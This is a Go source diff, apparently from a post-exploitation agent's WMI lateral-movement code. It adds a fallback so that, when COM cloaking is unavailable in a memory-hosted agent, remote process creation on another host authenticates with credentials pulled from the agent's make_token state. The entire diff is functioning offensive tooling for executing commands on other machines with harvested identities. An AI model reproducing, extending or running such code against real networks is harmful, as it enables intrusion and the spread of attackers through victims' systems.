@@ -75,6 +75,13 @@ func initializeWMISecurity() error {
 	return wmiSecurityErr
 }
 
+// wmiCloakingEffective reports whether this process's CoInitializeSecurity
+// actually applied EOAC_DYNAMIC_CLOAKING. When false (memory-hosted agent,
+// RPC_E_TOO_LATE), DCOM activation calls authenticate with the process
+// token instead of a thread's impersonation token — the ambient-identity
+// WMI path must fall back to explicit credentials.
+func wmiCloakingEffective() bool { return wmiSecurityHR == 0 }
+
 // wmiSecurityInitReport describes the single COM security initialization the
 // process actually got: the original CoInitializeSecurity HRESULT, the
 // classification that decided whether deployments may proceed, and whether
@@ -655,27 +662,39 @@ func wmiCreateProcessChain(host, command string, identity *winrmCredentials, amb
 	// domain of the payload.
 	authority := authorityAmbient
 	authnService := authnSvc
+	useExplicitBlanket := identity != nil
 	if identity != nil {
 		authority = identityAuthority
 		authnService = rpcCAuthnWinnt
 	}
-	// Set the proxy blanket on the LOCATOR before ConnectServer.
-	// ConnectServer is an RPC call on the locator proxy — its outbound
-	// authentication uses whatever security is bound to that proxy.
-	// When CoInitializeSecurity succeeded with EOAC_DYNAMIC_CLOAKING,
-	// new proxies inherit it and the locator blanket is redundant.
-	// When CoInitializeSecurity returned RPC_E_TOO_LATE (memory-hosted
-	// agents whose CLR host initialized COM first), the process-level
-	// cloaking was never applied and new proxies authenticate with the
-	// process token — the wrong identity for a make_token lateral move.
-	// Applying the blanket here ensures the ConnectServer RPC picks up
-	// the thread's impersonation token regardless of process-level state.
-	if identity == nil {
-		if hr, _, _ := procCoSetProxyBlanket.Call(
-			locator, authnSvc, rpcCAuthzNone, uintptr(unsafe.Pointer(serverPrincipal)),
-			rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, 0, eoacDynamicCloaking,
-		); hr != 0 {
-			return fmt.Errorf("CoSetProxyBlanket(locator) failed: 0x%08x", hr)
+	// Cloaking fallback: when CoInitializeSecurity never applied
+	// EOAC_DYNAMIC_CLOAKING (memory-hosted agent, CLR host initialized
+	// COM first → RPC_E_TOO_LATE), the ambient ConnectServer sends the
+	// process token — wrong for make_token lateral moves. Fall back to
+	// explicit credentials drawn from the active make_token state so
+	// ConnectServer authenticates through NTLM with the right identity.
+	// The thread stays impersonated for any subsequent proxy that
+	// honours cloaking set via CoSetProxyBlanket.
+	if identity == nil && ambient != 0 && !wmiCloakingEffective() {
+		tokenMu.Lock()
+		creds := spawnCredentials
+		tokenMu.Unlock()
+		if creds.user != "" {
+			fbUser, fbPass, fbAuth, fbBlanket, fbErr := wmiConnectIdentity(&creds)
+			if fbErr != nil {
+				return fmt.Errorf("prepare cloaking-fallback credentials: %w", fbErr)
+			}
+			defer sysFreeString(fbUser)
+			defer sysFreeString(fbPass)
+			defer sysFreeString(fbAuth)
+			defer runtime.KeepAlive(fbBlanket)
+			identityUser = fbUser
+			identityPassword = fbPass
+			identityAuthority = fbAuth
+			identityBlanket = fbBlanket
+			authority = fbAuth
+			authnService = rpcCAuthnWinnt
+			useExplicitBlanket = true
 		}
 	}
 	connectHR := comCallHR(locator, 3, namespace, identityUser, identityPassword, 0, 0,
@@ -699,8 +718,9 @@ func wmiCreateProcessChain(host, command string, identity *winrmCredentials, amb
 	defer comRelease(services)
 	// The blanket binds the SSPI identity of every WMI call on the proxy:
 	// dynamic cloaking for ambient deployments, an explicit auth identity
-	// when the operator supplied credentials.
-	if identity != nil {
+	// when the operator supplied credentials or the cloaking fallback
+	// promoted ambient credentials to explicit.
+	if useExplicitBlanket {
 		if hr, _, _ := procCoSetProxyBlanket.Call(
 			services, rpcCAuthnWinnt, rpcCAuthzNone, 0,
 			rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, uintptr(unsafe.Pointer(identityBlanket)), 0,
